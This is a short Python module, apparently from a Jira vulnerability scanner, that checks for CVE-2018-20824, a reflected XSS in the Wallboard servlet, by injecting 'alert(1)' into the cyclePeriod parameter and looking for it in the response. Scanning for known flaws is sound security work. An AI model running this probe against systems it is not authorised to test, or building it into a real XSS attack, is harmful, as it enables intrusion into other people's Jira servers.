#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from jiraffe.exploits.base import Exploit
from jiraffe.style import Style
from jiraffe.enums import Severity


class CVE201820824(Exploit):
    cve = "CVE-2018-20824"
    severity = Severity.HIGH
    description = "Wallboard dashboard XSS"

    def check(self) -> bool:
        payload = 'alert(1)'
        r = self.client.get(
            f"{self.target}/plugins/servlet/Wallboard/",
            params={
                "dashboardId": "10000",
                "cyclePeriod": payload,
            }
        )
        return payload in r.text

    def exploit(self) -> None:
        print(Style.CYAN("[*] Wallboard endpoint reachable (XSS vector)"))
